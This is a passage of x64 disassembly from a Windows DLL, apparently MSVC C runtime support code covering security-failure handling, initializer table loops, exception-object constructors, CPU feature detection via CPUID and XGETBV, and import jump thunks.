   180002d19:	55                   	push   %rbp
   180002d1a:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   180002d21:	ff 
   180002d22:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   180002d29:	8b d9                	mov    %ecx,%ebx
   180002d2b:	b9 17 00 00 00       	mov    $0x17,%ecx
   180002d30:	ff 15 1a 13 00 00    	call   *0x131a(%rip)        # 0x180004050
   180002d36:	85 c0                	test   %eax,%eax
   180002d38:	74 04                	je     0x180002d3e
   180002d3a:	8b cb                	mov    %ebx,%ecx
   180002d3c:	cd 29                	int    $0x29
   180002d3e:	b9 03 00 00 00       	mov    $0x3,%ecx
   180002d43:	e8 c4 ff ff ff       	call   0x180002d0c
   180002d48:	33 d2                	xor    %edx,%edx
   180002d4a:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002d4e:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   180002d54:	e8 3c 06 00 00       	call   0x180003395
   180002d59:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002d5d:	ff 15 2d 13 00 00    	call   *0x132d(%rip)        # 0x180004090
   180002d63:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   180002d6a:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   180002d71:	48 8b cb             	mov    %rbx,%rcx
   180002d74:	45 33 c0             	xor    %r8d,%r8d
   180002d77:	ff 15 ab 12 00 00    	call   *0x12ab(%rip)        # 0x180004028
   180002d7d:	48 85 c0             	test   %rax,%rax
   180002d80:	74 3c                	je     0x180002dbe
   180002d82:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   180002d88:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   180002d8f:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   180002d96:	4c 8b c8             	mov    %rax,%r9
   180002d99:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180002d9e:	4c 8b c3             	mov    %rbx,%r8
   180002da1:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   180002da8:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180002dad:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002db1:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180002db6:	33 c9                	xor    %ecx,%ecx
   180002db8:	ff 15 72 12 00 00    	call   *0x1272(%rip)        # 0x180004030
   180002dbe:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   180002dc5:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180002dca:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   180002dd1:	33 d2                	xor    %edx,%edx
   180002dd3:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   180002dda:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   180002de0:	48 83 c0 08          	add    $0x8,%rax
   180002de4:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   180002deb:	e8 a5 05 00 00       	call   0x180003395
   180002df0:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   180002df7:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180002dfc:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   180002e03:	40 
   180002e04:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   180002e0b:	00 
   180002e0c:	ff 15 66 12 00 00    	call   *0x1266(%rip)        # 0x180004078
   180002e12:	8b d8                	mov    %eax,%ebx
   180002e14:	33 c9                	xor    %ecx,%ecx
   180002e16:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   180002e1b:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180002e20:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   180002e24:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180002e29:	ff 15 11 12 00 00    	call   *0x1211(%rip)        # 0x180004040
   180002e2f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180002e34:	ff 15 fe 11 00 00    	call   *0x11fe(%rip)        # 0x180004038
   180002e3a:	85 c0                	test   %eax,%eax
   180002e3c:	75 0d                	jne    0x180002e4b
   180002e3e:	83 fb 01             	cmp    $0x1,%ebx
   180002e41:	74 08                	je     0x180002e4b
   180002e43:	8d 48 03             	lea    0x3(%rax),%ecx
   180002e46:	e8 c1 fe ff ff       	call   0x180002d0c
   180002e4b:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   180002e52:	00 
   180002e53:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   180002e5a:	5d                   	pop    %rbp
   180002e5b:	c3                   	ret
   180002e5c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002e61:	57                   	push   %rdi
   180002e62:	48 83 ec 20          	sub    $0x20,%rsp
   180002e66:	48 8d 1d 73 1b 00 00 	lea    0x1b73(%rip),%rbx        # 0x1800049e0
   180002e6d:	48 8d 3d 6c 1b 00 00 	lea    0x1b6c(%rip),%rdi        # 0x1800049e0
   180002e74:	eb 12                	jmp    0x180002e88
   180002e76:	48 8b 03             	mov    (%rbx),%rax
   180002e79:	48 85 c0             	test   %rax,%rax
   180002e7c:	74 06                	je     0x180002e84
   180002e7e:	ff 15 24 13 00 00    	call   *0x1324(%rip)        # 0x1800041a8
   180002e84:	48 83 c3 08          	add    $0x8,%rbx
   180002e88:	48 3b df             	cmp    %rdi,%rbx
   180002e8b:	72 e9                	jb     0x180002e76
   180002e8d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002e92:	48 83 c4 20          	add    $0x20,%rsp
   180002e96:	5f                   	pop    %rdi
   180002e97:	c3                   	ret
   180002e98:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002e9d:	57                   	push   %rdi
   180002e9e:	48 83 ec 20          	sub    $0x20,%rsp
   180002ea2:	48 8d 1d 47 1b 00 00 	lea    0x1b47(%rip),%rbx        # 0x1800049f0
   180002ea9:	48 8d 3d 40 1b 00 00 	lea    0x1b40(%rip),%rdi        # 0x1800049f0
   180002eb0:	eb 12                	jmp    0x180002ec4
   180002eb2:	48 8b 03             	mov    (%rbx),%rax
   180002eb5:	48 85 c0             	test   %rax,%rax
   180002eb8:	74 06                	je     0x180002ec0
   180002eba:	ff 15 e8 12 00 00    	call   *0x12e8(%rip)        # 0x1800041a8
   180002ec0:	48 83 c3 08          	add    $0x8,%rbx
   180002ec4:	48 3b df             	cmp    %rdi,%rbx
   180002ec7:	72 e9                	jb     0x180002eb2
   180002ec9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002ece:	48 83 c4 20          	add    $0x20,%rsp
   180002ed2:	5f                   	pop    %rdi
   180002ed3:	c3                   	ret
   180002ed4:	c2 00 00             	ret    $0x0
   180002ed7:	cc                   	int3
   180002ed8:	40 53                	rex push %rbx
   180002eda:	48 83 ec 20          	sub    $0x20,%rsp
   180002ede:	48 8b d9             	mov    %rcx,%rbx
   180002ee1:	48 8b c2             	mov    %rdx,%rax
   180002ee4:	48 8d 0d 5d 13 00 00 	lea    0x135d(%rip),%rcx        # 0x180004248
   180002eeb:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002eee:	48 89 0b             	mov    %rcx,(%rbx)
   180002ef1:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180002ef5:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180002ef9:	0f 11 02             	movups %xmm0,(%rdx)
   180002efc:	e8 9a 04 00 00       	call   0x18000339b
   180002f01:	48 8d 05 70 13 00 00 	lea    0x1370(%rip),%rax        # 0x180004278
   180002f08:	48 89 03             	mov    %rax,(%rbx)
   180002f0b:	48 8b c3             	mov    %rbx,%rax
   180002f0e:	48 83 c4 20          	add    $0x20,%rsp
   180002f12:	5b                   	pop    %rbx
   180002f13:	c3                   	ret
   180002f14:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   180002f19:	48 8d 05 68 13 00 00 	lea    0x1368(%rip),%rax        # 0x180004288
   180002f20:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180002f24:	48 8d 05 4d 13 00 00 	lea    0x134d(%rip),%rax        # 0x180004278
   180002f2b:	48 89 01             	mov    %rax,(%rcx)
   180002f2e:	48 8b c1             	mov    %rcx,%rax
   180002f31:	c3                   	ret
   180002f32:	cc                   	int3
   180002f33:	cc                   	int3
   180002f34:	40 53                	rex push %rbx
   180002f36:	48 83 ec 20          	sub    $0x20,%rsp
   180002f3a:	48 8b d9             	mov    %rcx,%rbx
   180002f3d:	48 8b c2             	mov    %rdx,%rax
   180002f40:	48 8d 0d 01 13 00 00 	lea    0x1301(%rip),%rcx        # 0x180004248
   180002f47:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002f4a:	48 89 0b             	mov    %rcx,(%rbx)
   180002f4d:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180002f51:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180002f55:	0f 11 02             	movups %xmm0,(%rdx)
   180002f58:	e8 3e 04 00 00       	call   0x18000339b
   180002f5d:	48 8d 05 3c 13 00 00 	lea    0x133c(%rip),%rax        # 0x1800042a0
   180002f64:	48 89 03             	mov    %rax,(%rbx)
   180002f67:	48 8b c3             	mov    %rbx,%rax
   180002f6a:	48 83 c4 20          	add    $0x20,%rsp
   180002f6e:	5b                   	pop    %rbx
   180002f6f:	c3                   	ret
   180002f70:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   180002f75:	48 8d 05 34 13 00 00 	lea    0x1334(%rip),%rax        # 0x1800042b0
   180002f7c:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180002f80:	48 8d 05 19 13 00 00 	lea    0x1319(%rip),%rax        # 0x1800042a0
   180002f87:	48 89 01             	mov    %rax,(%rcx)
   180002f8a:	48 8b c1             	mov    %rcx,%rax
   180002f8d:	c3                   	ret
   180002f8e:	cc                   	int3
   180002f8f:	cc                   	int3
   180002f90:	40 53                	rex push %rbx
   180002f92:	48 83 ec 20          	sub    $0x20,%rsp
   180002f96:	48 8b d9             	mov    %rcx,%rbx
   180002f99:	48 8b c2             	mov    %rdx,%rax
   180002f9c:	48 8d 0d a5 12 00 00 	lea    0x12a5(%rip),%rcx        # 0x180004248
   180002fa3:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002fa6:	48 89 0b             	mov    %rcx,(%rbx)
   180002fa9:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180002fad:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180002fb1:	0f 11 02             	movups %xmm0,(%rdx)
   180002fb4:	e8 e2 03 00 00       	call   0x18000339b
   180002fb9:	48 8b c3             	mov    %rbx,%rax
   180002fbc:	48 83 c4 20          	add    $0x20,%rsp
   180002fc0:	5b                   	pop    %rbx
   180002fc1:	c3                   	ret
   180002fc2:	cc                   	int3
   180002fc3:	cc                   	int3
   180002fc4:	48 8d 05 7d 12 00 00 	lea    0x127d(%rip),%rax        # 0x180004248
   180002fcb:	48 89 01             	mov    %rax,(%rcx)
   180002fce:	48 83 c1 08          	add    $0x8,%rcx
   180002fd2:	e9 ca 03 00 00       	jmp    0x1800033a1
   180002fd7:	cc                   	int3
   180002fd8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002fdd:	57                   	push   %rdi
   180002fde:	48 83 ec 20          	sub    $0x20,%rsp
   180002fe2:	48 8d 05 5f 12 00 00 	lea    0x125f(%rip),%rax        # 0x180004248
   180002fe9:	48 8b f9             	mov    %rcx,%rdi
   180002fec:	48 89 01             	mov    %rax,(%rcx)
   180002fef:	8b da                	mov    %edx,%ebx
   180002ff1:	48 83 c1 08          	add    $0x8,%rcx
   180002ff5:	e8 a7 03 00 00       	call   0x1800033a1
   180002ffa:	f6 c3 01             	test   $0x1,%bl
   180002ffd:	74 0d                	je     0x18000300c
   180002fff:	ba 18 00 00 00       	mov    $0x18,%edx
   180003004:	48 8b cf             	mov    %rdi,%rcx
   180003007:	e8 44 03 00 00       	call   0x180003350
   18000300c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003011:	48 8b c7             	mov    %rdi,%rax
   180003014:	48 83 c4 20          	add    $0x20,%rsp
   180003018:	5f                   	pop    %rdi
   180003019:	c3                   	ret
   18000301a:	cc                   	int3
   18000301b:	cc                   	int3
   18000301c:	48 83 ec 48          	sub    $0x48,%rsp
   180003020:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180003025:	e8 ea fe ff ff       	call   0x180002f14
   18000302a:	48 8d 15 97 1c 00 00 	lea    0x1c97(%rip),%rdx        # 0x180004cc8
   180003031:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180003036:	e8 6c 03 00 00       	call   0x1800033a7
   18000303b:	cc                   	int3
   18000303c:	48 83 ec 48          	sub    $0x48,%rsp
   180003040:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180003045:	e8 26 ff ff ff       	call   0x180002f70
   18000304a:	48 8d 15 ff 1c 00 00 	lea    0x1cff(%rip),%rdx        # 0x180004d50
   180003051:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180003056:	e8 4c 03 00 00       	call   0x1800033a7
   18000305b:	cc                   	int3
   18000305c:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   180003061:	48 8d 05 f0 11 00 00 	lea    0x11f0(%rip),%rax        # 0x180004258
   180003068:	48 0f 45 41 08       	cmovne 0x8(%rcx),%rax
   18000306d:	c3                   	ret
   18000306e:	cc                   	int3
   18000306f:	cc                   	int3
   180003070:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180003075:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000307a:	55                   	push   %rbp
   18000307b:	57                   	push   %rdi
   18000307c:	41 56                	push   %r14
   18000307e:	48 8b ec             	mov    %rsp,%rbp
   180003081:	48 83 ec 10          	sub    $0x10,%rsp
   180003085:	33 c0                	xor    %eax,%eax
   180003087:	33 c9                	xor    %ecx,%ecx
   180003089:	0f a2                	cpuid
   18000308b:	44 8b c1             	mov    %ecx,%r8d
   18000308e:	44 8b d2             	mov    %edx,%r10d
   180003091:	41 81 f2 69 6e 65 49 	xor    $0x49656e69,%r10d
   180003098:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   18000309f:	44 8b cb             	mov    %ebx,%r9d
   1800030a2:	44 8b f0             	mov    %eax,%r14d
   1800030a5:	33 c9                	xor    %ecx,%ecx
   1800030a7:	b8 01 00 00 00       	mov    $0x1,%eax
   1800030ac:	0f a2                	cpuid
   1800030ae:	45 0b d0             	or     %r8d,%r10d
   1800030b1:	89 45 f0             	mov    %eax,-0x10(%rbp)
   1800030b4:	41 81 f1 47 65 6e 75 	xor    $0x756e6547,%r9d
   1800030bb:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   1800030be:	45 0b d1             	or     %r9d,%r10d
   1800030c1:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   1800030c4:	8b f9                	mov    %ecx,%edi
   1800030c6:	89 55 fc             	mov    %edx,-0x4(%rbp)
   1800030c9:	75 5b                	jne    0x180003126
   1800030cb:	48 83 0d 95 2f 00 00 	orq    $0xffffffffffffffff,0x2f95(%rip)        # 0x180006068
   1800030d2:	ff 
   1800030d3:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   1800030d8:	48 c7 05 7d 2f 00 00 	movq   $0x8000,0x2f7d(%rip)        # 0x180006060
   1800030df:	00 80 00 00 
   1800030e3:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   1800030e8:	74 28                	je     0x180003112
   1800030ea:	3d 60 06 02 00       	cmp    $0x20660,%eax
   1800030ef:	74 21                	je     0x180003112
   1800030f1:	3d 70 06 02 00       	cmp    $0x20670,%eax
   1800030f6:	74 1a                	je     0x180003112
   1800030f8:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   1800030fd:	83 f8 20             	cmp    $0x20,%eax
   180003100:	77 24                	ja     0x180003126
   180003102:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   180003109:	00 00 00 
   18000310c:	48 0f a3 c1          	bt     %rax,%rcx
   180003110:	73 14                	jae    0x180003126
   180003112:	44 8b 05 e7 36 00 00 	mov    0x36e7(%rip),%r8d        # 0x180006800
   180003119:	41 83 c8 01          	or     $0x1,%r8d
   18000311d:	44 89 05 dc 36 00 00 	mov    %r8d,0x36dc(%rip)        # 0x180006800
   180003124:	eb 07                	jmp    0x18000312d
   180003126:	44 8b 05 d3 36 00 00 	mov    0x36d3(%rip),%r8d        # 0x180006800
   18000312d:	45 33 c9             	xor    %r9d,%r9d
   180003130:	41 8b f1             	mov    %r9d,%esi
   180003133:	45 8b d1             	mov    %r9d,%r10d
   180003136:	45 8b d9             	mov    %r9d,%r11d
   180003139:	41 83 fe 07          	cmp    $0x7,%r14d
   18000313d:	7c 65                	jl     0x1800031a4
   18000313f:	41 8d 41 07          	lea    0x7(%r9),%eax
   180003143:	33 c9                	xor    %ecx,%ecx
   180003145:	0f a2                	cpuid
   180003147:	89 45 f0             	mov    %eax,-0x10(%rbp)
   18000314a:	8b f2                	mov    %edx,%esi
   18000314c:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   18000314f:	44 8b cb             	mov    %ebx,%r9d
   180003152:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   180003155:	89 55 fc             	mov    %edx,-0x4(%rbp)
   180003158:	0f ba e3 09          	bt     $0x9,%ebx
   18000315c:	73 0b                	jae    0x180003169
   18000315e:	41 83 c8 02          	or     $0x2,%r8d
   180003162:	44 89 05 97 36 00 00 	mov    %r8d,0x3697(%rip)        # 0x180006800
   180003169:	83 f8 01             	cmp    $0x1,%eax
   18000316c:	7c 19                	jl     0x180003187
   18000316e:	b8 07 00 00 00       	mov    $0x7,%eax
   180003173:	8d 48 fa             	lea    -0x6(%rax),%ecx
   180003176:	0f a2                	cpuid
   180003178:	44 8b d2             	mov    %edx,%r10d
   18000317b:	89 45 f0             	mov    %eax,-0x10(%rbp)
   18000317e:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   180003181:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   180003184:	89 55 fc             	mov    %edx,-0x4(%rbp)
   180003187:	b8 24 00 00 00       	mov    $0x24,%eax
   18000318c:	44 3b f0             	cmp    %eax,%r14d
   18000318f:	7c 13                	jl     0x1800031a4
   180003191:	33 c9                	xor    %ecx,%ecx
   180003193:	0f a2                	cpuid
   180003195:	44 8b db             	mov    %ebx,%r11d
   180003198:	89 45 f0             	mov    %eax,-0x10(%rbp)
   18000319b:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   18000319e:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   1800031a1:	89 55 fc             	mov    %edx,-0x4(%rbp)
   1800031a4:	48 8b 05 a5 2e 00 00 	mov    0x2ea5(%rip),%rax        # 0x180006050
   1800031ab:	bb 06 00 00 00       	mov    $0x6,%ebx
   1800031b0:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   1800031b4:	c7 05 9a 2e 00 00 01 	movl   $0x1,0x2e9a(%rip)        # 0x180006058
   1800031bb:	00 00 00 
   1800031be:	c7 05 94 2e 00 00 02 	movl   $0x2,0x2e94(%rip)        # 0x18000605c
   1800031c5:	00 00 00 
   1800031c8:	48 89 05 81 2e 00 00 	mov    %rax,0x2e81(%rip)        # 0x180006050
   1800031cf:	0f ba e7 14          	bt     $0x14,%edi
   1800031d3:	73 1b                	jae    0x1800031f0
   1800031d5:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   1800031d9:	c7 05 75 2e 00 00 02 	movl   $0x2,0x2e75(%rip)        # 0x180006058
   1800031e0:	00 00 00 
   1800031e3:	48 89 05 66 2e 00 00 	mov    %rax,0x2e66(%rip)        # 0x180006050
   1800031ea:	89 1d 6c 2e 00 00    	mov    %ebx,0x2e6c(%rip)        # 0x18000605c
   1800031f0:	0f ba e7 1b          	bt     $0x1b,%edi
   1800031f4:	0f 83 2b 01 00 00    	jae    0x180003325
   1800031fa:	33 c9                	xor    %ecx,%ecx
   1800031fc:	0f 01 d0             	xgetbv
   1800031ff:	48 c1 e2 20          	shl    $0x20,%rdx
   180003203:	48 0b d0             	or     %rax,%rdx
   180003206:	48 89 55 20          	mov    %rdx,0x20(%rbp)
   18000320a:	0f ba e7 1c          	bt     $0x1c,%edi
   18000320e:	0f 83 f6 00 00 00    	jae    0x18000330a
   180003214:	48 8b 45 20          	mov    0x20(%rbp),%rax
   180003218:	22 c3                	and    %bl,%al
   18000321a:	3a c3                	cmp    %bl,%al
   18000321c:	0f 85 e8 00 00 00    	jne    0x18000330a
   180003222:	8b 05 34 2e 00 00    	mov    0x2e34(%rip),%eax        # 0x18000605c
   180003228:	b2 e0                	mov    $0xe0,%dl
   18000322a:	83 c8 08             	or     $0x8,%eax
   18000322d:	c7 05 21 2e 00 00 03 	movl   $0x3,0x2e21(%rip)        # 0x180006058
   180003234:	00 00 00 
   180003237:	89 05 1f 2e 00 00    	mov    %eax,0x2e1f(%rip)        # 0x18000605c
   18000323d:	41 f6 c1 20          	test   $0x20,%r9b
   180003241:	74 5d                	je     0x1800032a0
   180003243:	83 c8 20             	or     $0x20,%eax
   180003246:	c7 05 08 2e 00 00 05 	movl   $0x5,0x2e08(%rip)        # 0x180006058
   18000324d:	00 00 00 
   180003250:	89 05 06 2e 00 00    	mov    %eax,0x2e06(%rip)        # 0x18000605c
   180003256:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   18000325b:	48 8b 05 ee 2d 00 00 	mov    0x2dee(%rip),%rax        # 0x180006050
   180003262:	44 23 c9             	and    %ecx,%r9d
   180003265:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   180003269:	48 89 05 e0 2d 00 00 	mov    %rax,0x2de0(%rip)        # 0x180006050
   180003270:	44 3b c9             	cmp    %ecx,%r9d
   180003273:	75 32                	jne    0x1800032a7
   180003275:	48 8b 45 20          	mov    0x20(%rbp),%rax
   180003279:	22 c2                	and    %dl,%al
   18000327b:	3a c2                	cmp    %dl,%al
   18000327d:	75 21                	jne    0x1800032a0
   18000327f:	48 8b 05 ca 2d 00 00 	mov    0x2dca(%rip),%rax        # 0x180006050
   180003286:	83 0d cf 2d 00 00 40 	orl    $0x40,0x2dcf(%rip)        # 0x18000605c
   18000328d:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   180003291:	89 1d c1 2d 00 00    	mov    %ebx,0x2dc1(%rip)        # 0x180006058
   180003297:	48 89 05 b2 2d 00 00 	mov    %rax,0x2db2(%rip)        # 0x180006050
   18000329e:	eb 07                	jmp    0x1800032a7
   1800032a0:	48 8b 05 a9 2d 00 00 	mov    0x2da9(%rip),%rax        # 0x180006050
   1800032a7:	0f ba e6 17          	bt     $0x17,%esi
   1800032ab:	73 0c                	jae    0x1800032b9
   1800032ad:	48 0f ba f0 18       	btr    $0x18,%rax
   1800032b2:	48 89 05 97 2d 00 00 	mov    %rax,0x2d97(%rip)        # 0x180006050
   1800032b9:	41 0f ba e2 13       	bt     $0x13,%r10d
   1800032be:	73 4a                	jae    0x18000330a
   1800032c0:	48 8b 45 20          	mov    0x20(%rbp),%rax
   1800032c4:	22 c2                	and    %dl,%al
   1800032c6:	3a c2                	cmp    %dl,%al
   1800032c8:	75 40                	jne    0x18000330a
   1800032ca:	41 8b cb             	mov    %r11d,%ecx
   1800032cd:	41 8b c3             	mov    %r11d,%eax
   1800032d0:	48 c1 e9 10          	shr    $0x10,%rcx
   1800032d4:	25 ff 00 04 00       	and    $0x400ff,%eax
   1800032d9:	83 e1 07             	and    $0x7,%ecx
   1800032dc:	89 05 1a 35 00 00    	mov    %eax,0x351a(%rip)        # 0x1800067fc
   1800032e2:	48 81 c9 28 00 00 01 	or     $0x1000028,%rcx
   1800032e9:	48 f7 d1             	not    %rcx
   1800032ec:	48 23 0d 5d 2d 00 00 	and    0x2d5d(%rip),%rcx        # 0x180006050
   1800032f3:	48 89 0d 56 2d 00 00 	mov    %rcx,0x2d56(%rip)        # 0x180006050
   1800032fa:	83 f8 01             	cmp    $0x1,%eax
   1800032fd:	76 0b                	jbe    0x18000330a
   1800032ff:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   180003303:	48 89 0d 46 2d 00 00 	mov    %rcx,0x2d46(%rip)        # 0x180006050
   18000330a:	41 0f ba e2 15       	bt     $0x15,%r10d
   18000330f:	73 14                	jae    0x180003325
   180003311:	48 8b 45 20          	mov    0x20(%rbp),%rax
   180003315:	48 0f ba e0 13       	bt     $0x13,%rax
   18000331a:	73 09                	jae    0x180003325
   18000331c:	48 0f ba 35 2b 2d 00 	btrq   $0x7,0x2d2b(%rip)        # 0x180006050
   180003323:	00 07 
   180003325:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   18000332a:	33 c0                	xor    %eax,%eax
   18000332c:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180003331:	48 83 c4 10          	add    $0x10,%rsp
   180003335:	41 5e                	pop    %r14
   180003337:	5f                   	pop    %rdi
   180003338:	5d                   	pop    %rbp
   180003339:	c3                   	ret
   18000333a:	cc                   	int3
   18000333b:	cc                   	int3
   18000333c:	b8 01 00 00 00       	mov    $0x1,%eax
   180003341:	c3                   	ret
   180003342:	cc                   	int3
   180003343:	cc                   	int3
   180003344:	33 c0                	xor    %eax,%eax
   180003346:	39 05 24 2d 00 00    	cmp    %eax,0x2d24(%rip)        # 0x180006070
   18000334c:	0f 95 c0             	setne  %al
   18000334f:	c3                   	ret
   180003350:	e9 2f 00 00 00       	jmp    0x180003384
   180003355:	cc                   	int3
   180003356:	cc                   	int3
   180003357:	cc                   	int3
   180003358:	40 53                	rex push %rbx
   18000335a:	48 83 ec 20          	sub    $0x20,%rsp
   18000335e:	48 8d 05 6b 0f 00 00 	lea    0xf6b(%rip),%rax        # 0x1800042d0
   180003365:	48 8b d9             	mov    %rcx,%rbx
   180003368:	48 89 01             	mov    %rax,(%rcx)
   18000336b:	f6 c2 01             	test   $0x1,%dl
   18000336e:	74 0a                	je     0x18000337a
   180003370:	ba 18 00 00 00       	mov    $0x18,%edx
   180003375:	e8 d6 ff ff ff       	call   0x180003350
   18000337a:	48 8b c3             	mov    %rbx,%rax
   18000337d:	48 83 c4 20          	add    $0x20,%rsp
   180003381:	5b                   	pop    %rbx
   180003382:	c3                   	ret
   180003383:	cc                   	int3
   180003384:	e9 24 00 00 00       	jmp    0x1800033ad
   180003389:	ff 25 31 0d 00 00    	jmp    *0xd31(%rip)        # 0x1800040c0
   18000338f:	ff 25 1b 0d 00 00    	jmp    *0xd1b(%rip)        # 0x1800040b0
   180003395:	ff 25 05 0d 00 00    	jmp    *0xd05(%rip)        # 0x1800040a0
   18000339b:	ff 25 27 0d 00 00    	jmp    *0xd27(%rip)        # 0x1800040c8
   1800033a1:	ff 25 01 0d 00 00    	jmp    *0xd01(%rip)        # 0x1800040a8
   1800033a7:	ff 25 2b 0d 00 00    	jmp    *0xd2b(%rip)        # 0x1800040d8
   1800033ad:	ff 25 4d 0d 00 00    	jmp    *0xd4d(%rip)        # 0x180004100
   1800033b3:	ff 25 4f 0d 00 00    	jmp    *0xd4f(%rip)        # 0x180004108
   1800033b9:	ff 25 89 0d 00 00    	jmp    *0xd89(%rip)        # 0x180004148
   1800033bf:	ff 25 7b 0d 00 00    	jmp    *0xd7b(%rip)        # 0x180004140
   1800033c5:	ff 25 2d 0d 00 00    	jmp    *0xd2d(%rip)        # 0x1800040f8
   1800033cb:	ff 25 67 0d 00 00    	jmp    *0xd67(%rip)        # 0x180004138
   1800033d1:	ff 25 59 0d 00 00    	jmp    *0xd59(%rip)        # 0x180004130
   1800033d7:	ff 25 73 0d 00 00    	jmp    *0xd73(%rip)        # 0x180004150
   1800033dd:	ff 25 45 0d 00 00    	jmp    *0xd45(%rip)        # 0x180004128
   1800033e3:	ff 25 37 0d 00 00    	jmp    *0xd37(%rip)        # 0x180004120
   1800033e9:	ff 25 29 0d 00 00    	jmp    *0xd29(%rip)        # 0x180004118
   1800033ef:	cc                   	int3
   1800033f0:	b0 01                	mov    $0x1,%al
   1800033f2:	c3                   	ret
   1800033f3:	cc                   	int3
   1800033f4:	33 c0                	xor    %eax,%eax
   1800033f6:	c3                   	ret
   1800033f7:	cc                   	int3
   1800033f8:	48 83 ec 28          	sub    $0x28,%rsp
   1800033fc:	4d 8b 41 38          	mov    0x38(%r9),%r8
   180003400:	48 8b ca             	mov    %rdx,%rcx
   180003403:	49 8b d1             	mov    %r9,%rdx
   180003406:	e8 0d 00 00 00       	call   0x180003418
   18000340b:	b8 01 00 00 00       	mov    $0x1,%eax
   180003410:	48 83 c4 28          	add    $0x28,%rsp
   180003414:	c3                   	ret
   180003415:	cc                   	int3
   180003416:	cc                   	int3
   180003417:	cc                   	int3
   180003418:	40 53                	rex push %rbx
   18000341a:	45 8b 18             	mov    (%r8),%r11d
   18000341d:	48 8b da             	mov    %rdx,%rbx
   180003420:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   180003424:	4c 8b c9             	mov    %rcx,%r9
   180003427:	41 f6 00 04          	testb  $0x4,(%r8)
   18000342b:	4c 8b d1             	mov    %rcx,%r10
   18000342e:	74 13                	je     0x180003443
   180003430:	41 8b 40 08          	mov    0x8(%r8),%eax
   180003434:	4d 63 50 04          	movslq 0x4(%r8),%r10
   180003438:	f7 d8                	neg    %eax
   18000343a:	4c 03 d1             	add    %rcx,%r10
   18000343d:	48 63 c8             	movslq %eax,%rcx
   180003440:	4c 23 d1             	and    %rcx,%r10
